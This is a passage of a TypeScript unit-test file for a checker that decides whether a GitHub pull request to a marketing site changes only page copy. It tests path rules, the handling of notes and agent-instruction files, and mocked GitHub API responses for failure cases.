    expect(isActiveUrl('https://www.newtonschool.co/apply')).toBe(false);
    expect(isActiveUrl('/apply')).toBe(false);
    expect(isActiveUrl('tel:+91-6366275707')).toBe(false);
  });
});

describe('isContentPath', () => {
  it.each([
    ['src/features/agentic-ai-course/content.ts', true],
    ['src/features/data-science-ns-v4/sections/hero.tsx', true],
    ['src/features/nst-entrance/content/coding-nsat.ts', true],
    ['src/features/ai-masterclass/content/generative-ai-for-business-leaders.ts', true],
    ['src/features/data-science-v2/sections/use-of-ds.tsx', true],
    ['src/app/(landing)/courses/data-science/page.tsx', true],
    ['src/components/ui/card.tsx', true],
    ['src/lib/experiments/registry.ts', false],
    ['worker/paths.js', false],
    ['.github/workflows/deploy-prod.yml', false],
    ['src/app/layout.tsx', false],
    ['src/app/(landing)/layout.tsx', false],
    ['src/app/api/lead/route.ts', false],
    ['src/app/robots.ts', false],
    ['src/app/sitemap.ts', false],
    ['src/middleware.ts', false],
    ['src/features/data-science-ns-v4/forms/rcb-modal.tsx', false],
    ['src/features/agentic-ai-course/analytics.ts', false],
    ['src/features/data-science-ns-v4/experiment.ts', false],
    ['src/features/x/ab-test.ts', false],
    ['src/features/x/tracking.ts', false],
    ['src/features/koyo-ai-interviewer/tracking/device-id.ts', false],
    ['src/features/about-us/page-view-tracker.tsx', false],
    ['src/features/hire-from-us-version-3/ui/tracked-link.tsx', false],
    ['src/features/hire-from-us-version-3/auth/session-api.ts', false],
    ['src/features/hire-from-us-version-3/auth/session.ts', false],
    ['src/features/candidate-profiles-hire-from-us-v3/gate/gate-boot.tsx', false],
    ['src/features/data-science-ns-v5/ui/highlights-motion-gate.tsx', false],
    ['src/features/ds-shared/seat-nudge.ts', false],
    ['src/features/x/hooks/use-popup.ts', false],
    ['src/features/data-science-ns-v7/forms/use-instant-callback.ts', false],
    ['src/features/nst-apply/ui/logged-in-context.tsx', false],
    ['src/features/homepage/forms/home-modals-provider.tsx', false],
    ['src/features/agentic-ai-course/forms/apply-config.ts', false],
    ['src/features/agentic-generalist-program/config.ts', false],
    ['src/features/x/inline-script.ts', false],
    ['src/features/x/seatNudgeScript.ts', false],
    ['src/features/x/sections/hero.test.tsx', false],
    ['src/features/x/content.json', false],
    ['src/features/x/types.d.ts', false],
    ['package.json', false],
    // Round 2: experiments, events, utm, gtag, redirects, codes, payments, consent and settings.
    ['src/features/data-science-ns-v4/hero-inbound-experiment.ts', false],
    ['src/features/x/Hero-Experiment.ts', false],
    ['src/features/x/funnel/qualify.tsx', false],
    ['src/features/x/redirects.ts', false],
    ['src/features/x/redirect.tsx', false],
    ['src/features/x/routes.ts', false],
    ['src/features/x/events.ts', false],
    ['src/features/x/utm.ts', false],
    ['src/components/analytics/utm-propagation.tsx', false],
    ['src/features/x/gtag.ts', false],
    ['src/features/x/otp.tsx', false],
    ['src/features/x/payment.tsx', false],
    ['src/features/x/checkout.tsx', false],
    ['src/features/x/consent.tsx', false],
    ['src/features/x/env.ts', false],
    ['src/features/x/constants.ts', false],
    ['src/features/x/json-ld.tsx', false],
    ['src/features/x/structured-data.tsx', false],
    ['src/features/x/schema.ts', false],
    ['src/features/x/instrumentation.ts', false],
    ['src/app/(landing)/x/opengraph-image.tsx', false],
    ['src/app/(landing)/x/sitemap.ts', false],
    ['src/features/x/SESSION.ts', false],
    // Copy that only looks like a denied word.
    ['src/features/nst-fest/sections/events.tsx', true],
    ['src/features/x/sections/course-description.tsx', true],
    ['src/features/x/sections/footprint.tsx', true],
  ])('%s → %s', (filePath, expected) => {
    expect(isContentPath(filePath, policy)).toBe(expected);
  });

  // A feature's own notes never ship to the site. Agent instructions do not
  // count: a later run would read them as orders.
  it.each([
    ['src/features/x/README.md', true],
    ['src/features/x/sections/Readme.md', true],
    ['src/features/nst-apply/_design/REHOST-CAMPUS-AMENITIES.md', false],
    ['src/features/x/_design/README.md', false],
    ['src/features/x/notes.MD', false],
    ['src/features/x/CHANGELOG.md', false],
    ['src/features/nst-home/CLAUDE.md', false],
    ['src/features/nst-shell/PAGES-CLAUDE.md', false],
    ['src/features/data-science-ns-v5/_design/reference/hero-sequence/AGENTS.md', false],
    ['src/features/x/skills/SKILL.md', false],
    ['src/features/x/.claude/notes.md', false],
    ['src/features/x/forms/README.md', false],
    ['src/features/x/gate/README.md', false],
    ['CLAUDE.md', false],
    ['AGENTS.md', false],
    ['src/app/(landing)/newton-school-of-technology-nst/placement/CLAUDE.md', false],
    ['src/components/README.md', false],
    ['.claude/skills/parity-audit/SKILL.md', false],
    ['src/features/x/notes.mdx', false],
    ['src/features/x/ledger.json', false],
  ])('counts %s as a note: %s', (filePath, expected) => {
    expect(isNotePath(filePath, policy)).toBe(expected);
  });

  it('reads ** as any number of folders, none included', () => {
    expect(globToRegExp('**/forms/**').test('forms/a.tsx')).toBe(true);
    expect(globToRegExp('**/forms/**').test('src/x/forms/a.tsx')).toBe(true);
    expect(globToRegExp('src/*.ts').test('src/a/b.ts')).toBe(false);
  });
});

describe('checkContentOnlyPr', () => {
  const api = 'https://api.github.com/repos/Newton-School/newton-marketing-web';
  const json = (body: unknown, status = 200) => new Response(JSON.stringify(body), { status });

  /** GitHub as a map from URL to answer; anything else is a 404. */
  function github(routes: Record<string, () => Response>) {
    return vi.fn(async (url: string) => (routes[url] ?? (() => new Response('not found', { status: 404 })))());
  }
  const pr =
    (base = 'main', defaultBranch = 'main') =>
    () =>
      json({ state: 'open', head: { sha: 'HEAD' }, base: { ref: base, repo: { default_branch: defaultBranch } } });
  const compare =
    (...entries: Array<[string, string]>) =>
    () =>
      json({ merge_base_commit: { sha: 'MB' }, files: entries.map(([filename, status]) => ({ filename, status })) });
  const raw = (text: string) => () => new Response(text);
  const check = (fetcher: ReturnType<typeof github>, signal?: AbortSignal) =>
    checkContentOnlyPr({
      owner: 'Newton-School',
      repo: 'newton-marketing-web',
      number: 1490,
      githubToken: 'ghs_test',
      policy,
      fetcher,
      signal,
    });
  const PATH = 'src/features/agentic-ai-course/content.ts';
  const copyEdit = () => ({
    [`${api}/pulls/1490`]: pr(),
    [`${api}/compare/main...HEAD`]: compare([PATH, 'modified']),
    [`${api}/contents/${PATH}?ref=MB`]: raw(CONTENT),
    [`${api}/contents/${PATH}?ref=HEAD`]: raw(CONTENT.replace('150000', '175000')),
  });

  it('passes a copy edit, comparing the head with where it left the base branch', async () => {
    const fetcher = github(copyEdit());

    expect(await check(fetcher)).toEqual({ contentOnly: true, files: [PATH], headSha: 'HEAD', baseRef: 'main' });
    const headers = (fetcher.mock.calls[0] as unknown as [string, RequestInit])[1].headers as Record<string, string>;
    expect(headers.Authorization).toBe('Bearer ghs_test');
  });

  it('names the file that changes code', async () => {
    const path = 'src/features/x/sections/hero.tsx';
    const fetcher = github({
      [`${api}/pulls/1490`]: pr(),
      [`${api}/compare/main...HEAD`]: compare([path, 'modified']),
      [`${api}/contents/${path}?ref=MB`]: raw(HERO),
      [`${api}/contents/${path}?ref=HEAD`]: raw(HERO.replace('className="p-4"', 'className="p-8"')),
    });

    expect(await check(fetcher)).toMatchObject({ contentOnly: false, kind: 'not_content', offending: [path] });
  });

  it('turns down a PR into a branch other than the default one, without reading the diff', async () => {
    const fetcher = github({ [`${api}/pulls/1490`]: pr('release') });

    expect(await check(fetcher)).toMatchObject({ contentOnly: false, kind: 'not_default_base' });
    expect(fetcher).toHaveBeenCalledTimes(1);
  });

  it.each([
    ['an added file', ['src/features/x/content.ts', 'added']],
    ['a renamed file', ['src/features/x/content.ts', 'renamed']],
    ['a removed file', ['src/features/x/content.ts', 'removed']],
    ['a worker file', ['worker/paths.js', 'modified']],
    ['a denied path', ['src/lib/experiments/registry.ts', 'modified']],
  ] as Array<[string, [string, string]]>)('turns down %s without reading it', async (_case, entry) => {
    const fetcher = github({ [`${api}/pulls/1490`]: pr(), [`${api}/compare/main...HEAD`]: compare(entry) });

    expect(await check(fetcher)).toMatchObject({ contentOnly: false, kind: 'not_content', offending: [entry[0]] });
    expect(fetcher.mock.calls.some(call => String(call[0]).includes('/contents/'))).toBe(false);
  });

  it.each([
    [CONTENT_ONLY_MAX_FILES + 1, 'It changes 21 files.'],
    [300, 'It changes 300 or more files.'],
  ])('turns down %i files', async (count, reason) => {
    const many = Array.from(
      { length: count },
      (_, i) => [`src/features/x/content-${i}.ts`, 'modified'] as [string, string],
    );
    const fetcher = github({ [`${api}/pulls/1490`]: pr(), [`${api}/compare/main...HEAD`]: compare(...many) });

    expect(await check(fetcher)).toMatchObject({ contentOnly: false, kind: 'too_many_files', reason });
  });

  it.each([
    ['the PR cannot be read', {}],
    [
      'the PR is closed',
      {
        [`${api}/pulls/1490`]: () =>
          json({ state: 'closed', head: { sha: 'H' }, base: { ref: 'main', repo: { default_branch: 'main' } } }),
      },
    ],
    ['the comparison cannot be read', { [`${api}/pulls/1490`]: pr() }],
    [
      'a file cannot be read',
      {
        [`${api}/pulls/1490`]: pr(),
        [`${api}/compare/main...HEAD`]: compare(['src/features/x/content.ts', 'modified']),
      },
    ],
    [
      'a file is too large',
      {
        [`${api}/pulls/1490`]: pr(),
        [`${api}/compare/main...HEAD`]: compare(['src/features/x/content.ts', 'modified']),
        [`${api}/contents/src/features/x/content.ts?ref=MB`]: raw(`export const a = { t: '${'x'.repeat(250_000)}' };`),
        [`${api}/contents/src/features/x/content.ts?ref=HEAD`]: raw(CONTENT),
      },
    ],
    [
      'a file does not parse',
      {
        [`${api}/pulls/1490`]: pr(),
        [`${api}/compare/main...HEAD`]: compare(['src/features/x/content.ts', 'modified']),
        [`${api}/contents/src/features/x/content.ts?ref=MB`]: raw(CONTENT),
        [`${api}/contents/src/features/x/content.ts?ref=HEAD`]: raw('export const = {'),
      },
    ],
  ] as Array<[string, Record<string, () => Response>]>)('is not content-only when %s', async (_case, routes) => {
    expect(await check(github(routes))).toMatchObject({ contentOnly: false, kind: 'unreadable' });
  });

  it('never throws, even when the network does', async () => {
    const fetcher = vi.fn().mockRejectedValue(new Error('ECONNRESET'));
    expect(await check(fetcher as never)).toMatchObject({ contentOnly: false, kind: 'unreadable' });
  });

  it('reads nothing more once the run is cancelled', async () => {
    const controller = new AbortController();
    const routes = copyEdit();
    const fetcher = github({
      ...routes,
      [`${api}/pulls/1490`]: () => {
        controller.abort();
        return routes[`${api}/pulls/1490`]();
      },
    });

    expect(await check(fetcher, controller.signal)).toMatchObject({
      contentOnly: false,
      kind: 'unreadable',
      reason: 'The run was cancelled.',
    });
    expect(fetcher).toHaveBeenCalledTimes(1);
  });

  it("passes a copy edit with the feature's notes, without reading the notes", async () => {
    const note = 'src/features/agentic-ai-course/README.md';
    const routes = copyEdit();
    const fetcher = github({
      ...routes,
      [`${api}/compare/main...HEAD`]: compare([PATH, 'modified'], [note, 'modified']),
    });

    expect(await check(fetcher)).toEqual({ contentOnly: true, files: [PATH, note], headSha: 'HEAD', baseRef: 'main' });
    expect(fetcher.mock.calls.some(call => String(call[0]).includes('README.md'))).toBe(false);
  });

  it.each([
    ['an added note', ['src/features/x/README.md', 'added']],
    ["the feature's agent instructions", ['src/features/agentic-ai-course/CLAUDE.md', 'modified']],
    ['a removed note', ['src/features/x/README.md', 'removed']],
    ['a renamed note', ['src/features/x/README.md', 'renamed']],
    ['the root CLAUDE.md', ['CLAUDE.md', 'modified']],
    ['the root AGENTS.md', ['AGENTS.md', 'modified']],
    ['a note outside features', ['src/app/(landing)/x/CLAUDE.md', 'modified']],
  ] as Array<[string, [string, string]]>)('turns down a copy edit with %s', async (_case, entry) => {
    const fetcher = github({ ...copyEdit(), [`${api}/compare/main...HEAD`]: compare([PATH, 'modified'], entry) });

    expect(await check(fetcher)).toMatchObject({ contentOnly: false, kind: 'not_content', offending: [entry[0]] });
  });

  it('encodes route folders in a file path', async () => {
    const path = 'src/app/(landing)/courses/ai/page.tsx';
    const encoded = path.split('/').map(encodeURIComponent).join('/');
    const fetcher = github({
      [`${api}/pulls/1490`]: pr(),
      [`${api}/compare/main...HEAD`]: compare([path, 'modified']),
      [`${api}/contents/${encoded}?ref=MB`]: raw(HERO),
      [`${api}/contents/${encoded}?ref=HEAD`]: raw(HERO.replace('Apply now', 'Apply today')),
    });

    expect(await check(fetcher)).toEqual({ contentOnly: true, files: [path], headSha: 'HEAD', baseRef: 'main' });
  });
});
